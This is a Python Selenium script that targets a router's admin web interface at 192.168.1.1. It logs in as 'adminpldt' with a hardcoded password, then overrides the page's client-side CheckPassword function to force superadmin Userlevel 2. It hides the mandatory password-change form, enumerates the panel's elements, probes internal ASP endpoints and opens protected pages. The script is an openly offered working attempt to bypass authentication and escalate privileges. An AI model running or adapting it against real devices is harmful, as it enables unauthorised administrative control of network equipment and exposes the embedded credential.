#!/usr/bin/env python3
"""Login as adminpldt on admin.html, force Userlevel=2, skip password change form, explore admin panel."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(20)
    return driver

driver = setup_driver()
try:
    print("1. Navigate to admin.html...")
    driver.get(ROUTER + "/admin.html")
    time.sleep(5)

    pf = driver.execute_script("return window.preflag;")
    cm = driver.execute_script("return window.CfgMode;")
    print("   preflag:", pf, "CfgMode:", cm)

    # Override CheckPassword to return 2 (superadmin) WITHOUT hitting server
    print("2. Overriding CheckPassword to return 2, filling credentials...")
    driver.execute_script("window.CheckPassword = function(pwd) { return 2; };")
    driver.execute_script("window.setDisable = function() {};")

    u = driver.find_element(By.ID, "txt_Username")
    p = driver.find_element(By.ID, "txt_Password")
    driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
    u.send_keys("adminpldt")
    p.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")

    print("3. Clicking login button...")
    driver.execute_script("document.getElementById('button').style.display = '';")
    driver.find_element(By.ID, "button").click()
    time.sleep(5)

    url = driver.current_url
    has_login = "txt_Username" in driver.page_source
    lvl = driver.execute_script("try { return window.Userlevel; } catch(e) { return 'err'; }")
    print("   URL:", url, "login_form:", has_login, "Userlevel:", lvl)

    # Check if password change form is shown
    pwd_vis = driver.execute_script("""
        var pm = document.getElementById('pwd_modify');
        return pm ? pm.style.display : 'not found';
    """)
    base_vis = driver.execute_script("""
        var bm = document.getElementById('base_mask');
        return bm ? bm.style.display : 'not found';
    """)
    print("   pwd_modify:", pwd_vis, "base_mask:", base_vis)

    if int(str(lvl)) == 2:
        print("\n*** Userlevel=2 achieved ***")

        # Skip the password change form
        print("4. Skipping password change form...")
        driver.execute_script("""
            var m = document.getElementById('base_mask');
            var p = document.getElementById('pwd_modify');
            if (m) m.style.display = 'none';
            if (p) p.style.display = 'none';
        """)
        time.sleep(1)

        # Now check what's visible on the page
        print("5. Exploring visible elements after skipping form...")
        info = driver.execute_script("""
            var r = {inputs: [], buttons: [], links: [], divs: [], iframes: [], selects: []};
            document.querySelectorAll('input').forEach(function(el) {
                var vis = el.offsetParent !== null;
                if (vis || el.type === 'hidden')
                    r.inputs.push({id: el.id, name: el.name, type: el.type, val: (el.value||'').substring(0,80), vis: vis});
            });
            document.querySelectorAll('button, input[type=button]').forEach(function(el) {
                r.buttons.push({id: el.id, text: (el.textContent||el.value||'').trim(), vis: el.offsetParent !== null});
            });
            document.querySelectorAll('a[href]').forEach(function(el) {
                if (el.offsetParent !== null)
                    r.links.push({href: el.href, text: el.textContent.trim().substring(0,80)});
            });
            document.querySelectorAll('div[id]').forEach(function(el) {
                if (el.offsetParent !== null) {
                    var t = (el.textContent||'').trim();
                    if (t.length > 0 && t.length < 300) r.divs.push({id: el.id, text: t.substring(0,150)});
                }
            });
            document.querySelectorAll('iframe').forEach(function(el) {
                r.iframes.push({src: el.src, id: el.id});
            });
            document.querySelectorAll('select').forEach(function(el) {
                if (el.offsetParent !== null) {
                    var opts = [];
                    el.querySelectorAll('option').forEach(function(o) { opts.push(o.value+':'+o.textContent.trim()); });
                    r.selects.push({id: el.id, opts: opts.slice(0,10)});
                }
            });
            return r;
        """)

        print("\n   VISIBLE INPUTS:")
        for i in info["inputs"]:
            if i["vis"]:
                print("    " + i["id"] + "/" + i["name"] + " [" + i["type"] + "] = " + i["val"][:60])

        print("\n   ALL BUTTONS:")
        for b in info["buttons"]:
            print("    " + b["id"] + ": " + b["text"] + " vis=" + str(b["vis"]))

        print("\n   VISIBLE LINKS:")
        for l in info["links"]:
            print("    " + l["href"] + " -> " + l["text"])

        print("\n   VISIBLE DIVS (first 30):")
        for d in info["divs"][:30]:
            print("    " + d["id"] + ": " + d["text"][:100])

        print("\n   IFRAMES:")
        for f in info["iframes"]:
            print("    " + f["src"] + " id=" + f["id"])

        print("\n   SELECTS:")
        for s in info["selects"]:
            print("    " + s["id"] + ": " + str(s["opts"][:5]))

        # Test AJAX access
        print("\n6. Testing AJAX access...")
        for url2, method, data in [
            ("/asp/GetRandCount.asp", "GET", ""),
            ("/asp/CheckPwdNotLogin.asp", "POST", "UserNameInfo=admin&NormalPwdInfo=test"),
            ("/asp/GetUserInfo.asp", "POST", ""),
            ("/html/ssmp/info/basic/system_info.asp", "GET", ""),
            ("/html/amp/wlanbasic/WlanBasic.asp?2G", "GET", ""),
        ]:
            try:
                r = driver.execute_script("""
                    var r = null;
                    $.ajax({type: arguments[1], async: false, cache: false, url: arguments[0], data: arguments[2],
                        success: function(d) { r = {ok: true, data: String(d).substring(0, 300)}; },
                        error: function(xhr) { r = {ok: false, code: xhr.status}; }
                    });
                    return r;
                """, url2, method, data)
                print("   " + url2 + " -> " + ("OK:" + r.get("data", "")[:120] if r.get("ok") else str(r)))
            except Exception as e:
                print("   " + url2 + " -> ERR:" + str(e)[:80])

        # Save page
        with open("admin_panel.html", "w", encoding="utf-8") as f:
            f.write(driver.page_source)
        print("\n   Saved admin_panel.html")

        # Try navigating to protected pages
        print("\n7. Navigating to protected pages...")
        for pg in ["/html/amp/wlanbasic/WlanBasic.asp?2G",
                    "/html/ssmp/info/basic/system_info.asp",
                    "/html/ssmp/accout/UserInfo.asp",
                    "/html/amp/advancesetting/AdvancedSetting.asp"]:
            driver.get(ROUTER + pg)
            time.sleep(3)
            has_l = "txt_Username" in driver.page_source
            title = driver.execute_script("return document.title;")
            print("   " + pg + " -> login:" + str(has_l) + " title:" + str(title)[:50])

    else:
        print("   Still not Userlevel 2")

finally:
    driver.quit()
